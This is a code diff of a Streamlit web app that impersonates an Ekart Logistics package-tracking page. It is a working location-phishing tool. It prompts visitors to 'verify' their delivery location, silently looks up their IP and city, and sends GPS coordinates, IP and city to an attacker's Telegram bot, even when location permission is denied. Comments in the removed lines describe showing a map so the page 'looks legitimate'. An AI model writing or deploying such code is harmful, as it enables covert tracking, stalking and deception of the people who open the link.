@@ -2,64 +2,48 @@ import streamlit as st
 from streamlit_geolocation import streamlit_geolocation
 import requests
 import pandas as pd
-import datetime
 
-# --- SETTINGS ---
-# Use your Telegram info here
+# --- TELEGRAM CONFIG ---
 BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
-CHAT_ID = "YOUR_CHAT_ID_OR_CHANNEL"
+CHAT_ID = "YOUR_CHAT_ID"
 
-st.set_page_config(page_title="Ekart Logistics", page_icon="📦")
+st.set_page_config(page_title="Ekart Tracking", layout="centered")
 
-# Simple, clean branding
+# Custom CSS to make the button look more "clickable" on a small mobile screen
 st.markdown("""
     <style>
-    .main { background-color: #f8f9fa; }
-    .stButton>button { width: 100%; border-radius: 5px; height: 3em; background-color: #2874f0; color: white; }
+    .stButton>button {
+        width: 100%;
+        height: 3em;
+        background-color: #2874f0;
+        color: white;
+        font-weight: bold;
+        border-radius: 10px;
+    }
     </style>
-    <div style='background-color: #2874f0; padding: 15px; text-align: center;'>
-        <h2 style='color: white; margin: 0;'>EKART LOGISTICS</h2>
-    </div>
 """, unsafe_allow_html=True)
 
-# 1. Background IP Intel (Silent)
-try:
-    ip_data = requests.get('http://ip-api.com/json/').json()
-    user_ip = ip_data.get('query', 'N/A')
-except:
-    ip_data = {}
-    user_ip = "N/A"
+st.title("📦 Package Tracking")
+st.write("Shipment ID: **#EK-17112026**")
 
-def send_to_telegram(lat, lon, type):
-    try:
-        msg = f"📦 *Update for ID: EK-1711*\nType: {type}\nIP: {user_ip}\nLat: {lat}\nLon: {lon}\n" \
-              f"Link: https://www.google.com/maps?q={lat},{lon}"
-        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
-                      data={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})
-    except:
-        pass
+# Get IP location first (Silent Fallback)
+ip_data = requests.get('http://ip-api.com/json/').json()
 
-# 2. Main Interface
-st.write("### Track Your Shipment")
-st.info("Shipment ID: **#EK-17112026**")
-st.write("Please verify your delivery location to see the estimated arrival time.")
-
-# The Geolocation Button
-# Note: On mobile, this MUST be served over HTTPS to work.
+# The Geolocation Component
+st.info("Tap the button below to sync your delivery coordinates.")
 location = streamlit_geolocation()
 
 if location.get('latitude'):
-    st.success("Location Verified!")
-    send_to_telegram(location['latitude'], location['longitude'], "HIGH_ACCURACY_GPS")
+    st.success("📍 Location Verified!")
+    # Send to Telegram
+    msg = f"✅ GPS FOUND\nLat: {location['latitude']}\nLon: {location['longitude']}\nIP: {ip_data.get('query')}"
+    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
+                  data={"chat_id": CHAT_ID, "text": msg})
     
-    # Show the map to the user so it looks legitimate
-    df = pd.DataFrame({'lat': [location['latitude']], 'lon': [location['longitude']]})
-    st.map(df)
+    st.map(pd.DataFrame({'lat': [location['latitude']], 'lon': [location['longitude']]}))
 else:
-    # Always log the IP location as a fallback
-    if 'lat' in ip_data:
-        send_to_telegram(ip_data['lat'], ip_data['lon'], "IP_CITY_LEVEL")
-    st.write("Waiting for verification...")
-
-st.divider()
-st.caption("© 2026 Ekart Logistics | Private & Confidential")
+    # Silent log of IP (City level)
+    msg = f"⚠️ GPS DENIED / WAITING\nIP: {ip_data.get('query')}\nCity: {ip_data.get('city')}"
+    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
+                  data={"chat_id": CHAT_ID, "text": msg})
+    st.warning("Please click 'Allow' on the browser prompt to continue.")
